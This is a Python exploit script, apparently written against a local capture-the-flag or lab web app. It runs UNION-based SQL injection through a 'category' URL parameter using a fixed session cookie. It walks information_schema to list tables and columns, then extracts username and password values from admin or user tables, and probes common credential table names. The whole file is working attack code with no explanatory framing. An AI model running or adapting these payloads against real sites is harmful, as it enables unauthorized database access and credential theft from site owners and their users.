import requests
import urllib.parse
import re

target = "http://127.0.0.1:32780/"
session = requests.Session()
session.cookies.set('PHPSESSID', 'a619c2d322b0d2025997d9751eb6d09a')

print("[+] Extracting Database Structure via SQL Injection")
print(f"[+] Target: {target}")

# Function to extract table names one by one
def extract_table_name(index):
    """Extract a specific table name by index"""
    payload = f"Nature' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {index},1#"
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    response_text = r.text
    
    # Remove HTML tags to find the table name
    clean_text = re.sub(r'<[^>]+>', '', response_text)
    clean_text = re.sub(r'\s+', ' ', clean_text).strip()
    
    # Look for obvious table name patterns
    # The response contains option values for categories, so extract anything that's not a category
    categories = ['Nature', 'Tech', 'Cooking', 'Photography', 'Health', 'All Categories']
    
    # Find words that might be table names (not HTML tags or categories)
    words = re.findall(r'\b[a-zA-Z_]+\b', clean_text)
    potential_tables = [w for w in words if w not in categories and len(w) > 2]
    
    # Remove common SQL/HTML words
    exclude_words = ['SELECT', 'FROM', 'WHERE', 'LIMIT', 'table_name', 'information_schema', 'tables', 'table_schema', 'database', 'Notice', 'Undefined', 'variable', 'category', 'html', 'index', 'php', 'line']
    potential_tables = [w for w in potential_tables if w not in [word.lower() for word in exclude_words]]
    
    return potential_tables, response_text

# Extract multiple tables
print("\n[+] Phase 1: Extracting all table names")
tables = []
for i in range(15):  # Try to get up to 15 tables
    print(f"\n[+] Trying to extract table {i}...")
    potential_tables, response = extract_table_name(i)
    
    if potential_tables:
        table = potential_tables[0]
        tables.append(table)
        print(f"[!] Table {i}: {table}")
    else:
        print(f"[-] No table found at index {i}")
        break

print(f"\n[!] ALL TABLES FOUND: {tables}")

# Phase 2: Extract columns from interesting tables
interesting_tables = [t for t in tables if any(keyword in t.lower() for keyword in ['admin', 'user', 'account', 'login'])]

if interesting_tables:
    target_table = interesting_tables[0]
    print(f"\n[+] Phase 2: Extracting columns from '{target_table}'")
    
    columns = []
    for i in range(10):  # Try to get up to 10 columns
        payload = f"Nature' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{target_table}' LIMIT {i},1#"
        r = session.get(target + "?category=" + urllib.parse.quote(payload))
        response_text = r.text
        
        clean_text = re.sub(r'<[^>]+>', '', response_text)
        clean_text = re.sub(r'\s+', ' ', clean_text).strip()
        
        # Extract potential column names
        words = re.findall(r'\b[a-zA-Z_]+\b', clean_text)
        categories = ['Nature', 'Tech', 'Cooking', 'Photography', 'Health', 'All Categories']
        potential_cols = [w for w in words if w not in categories and len(w) > 2]
        
        exclude = ['SELECT', 'FROM', 'WHERE', 'LIMIT', 'column_name', 'information_schema', 'columns', 'table_name', 'Notice', 'Undefined', 'variable', 'category', 'html', 'index', 'php', 'line']
        potential_cols = [w for w in potential_cols if w.lower() not in [ex.lower() for ex in exclude]]
        
        if potential_cols:
            col = potential_cols[0]
            columns.append(col)
            print(f"[!] Column {i}: {col}")
        else:
            print(f"[-] No column found at index {i}")
            break
    
    print(f"\n[!] COLUMNS IN {target_table}: {columns}")
    
    # Phase 3: Extract credentials if we found username/password columns
    user_col = None
    pass_col = None
    
    for col in columns:
        if 'user' in col.lower():
            user_col = col
        elif 'pass' in col.lower():
            pass_col = col
    
    if user_col and pass_col:
        print(f"\n[+] Phase 3: Extracting credentials from {user_col}, {pass_col}")
        
        # Extract username
        payload = f"Nature' UNION SELECT {user_col} FROM {target_table} LIMIT 1#"
        r = session.get(target + "?category=" + urllib.parse.quote(payload))
        response_text = r.text
        
        print(f"\n[!] User payload: {payload}")
        print(f"[!] Response:\n{response_text[:1000]}")
        
        # Extract password
        payload = f"Nature' UNION SELECT {pass_col} FROM {target_table} LIMIT 1#"
        r = session.get(target + "?category=" + urllib.parse.quote(payload))
        response_text = r.text
        
        print(f"\n[!] Password payload: {payload}")
        print(f"[!] Response:\n{response_text[:1000]}")
        
else:
    print("\n[-] No admin/user tables found, trying all tables for credentials")
    
    for table in tables:
        print(f"\n[+] Checking table: {table}")
        
        # Try common credential columns
        for col_pair in [('username', 'password'), ('user', 'pass'), ('email', 'password'), ('admin_user', 'admin_pass')]:
            user_col, pass_col = col_pair
            
            # Try to extract from this table
            payload = f"Nature' UNION SELECT {user_col} FROM {table} LIMIT 1#"
            r = session.get(target + "?category=" + urllib.parse.quote(payload))
            
            if r.status_code == 200:
                response_text = r.text
                clean = re.sub(r'<[^>]+>', '', response_text)
                words = re.findall(r'\b[a-zA-Z0-9_.-]+\b', clean)
                
                # Filter out categories and common words
                categories = ['Nature', 'Tech', 'Cooking', 'Photography', 'Health', 'All Categories', 'SELECT', 'FROM', 'WHERE', 'LIMIT', 'Notice', 'Undefined', 'variable', 'category', 'html', 'index', 'php', 'line']
                potential_data = [w for w in words if w not in categories and len(w) > 3]
                
                if potential_data:
                    print(f"[!] Potential data in {table}.{user_col}: {potential_data[:3]}")

# Phase 4: Also check if there's a direct users/admins table name
print("\n[+] Phase 4: Checking for common credential tables")
common_tables = ['users', 'admins', 'accounts', 'logins', 'user_accounts']
for table in common_tables:
    payload = f"Nature' UNION SELECT 'test' FROM {table} LIMIT 1#"
    r = session.get(target + "?category=" + urllib.parse.quote(payload))
    
    # If no SQL error about table not existing, it might exist
    if "doesn\'t exist" not in r.text and "not found" not in r.text.lower():
        print(f"[!] Table '{table}' might exist (no 'table not found' error)")
        
        # Try to extract from it
        payload = f"Nature' UNION SELECT COUNT(*) FROM {table}#"
        r = session.get(target + "?category=" + urllib.parse.quote(payload))
        print(f"[!] Row count query response size: {len(r.text)}")

print("\n[+] Database extraction complete")
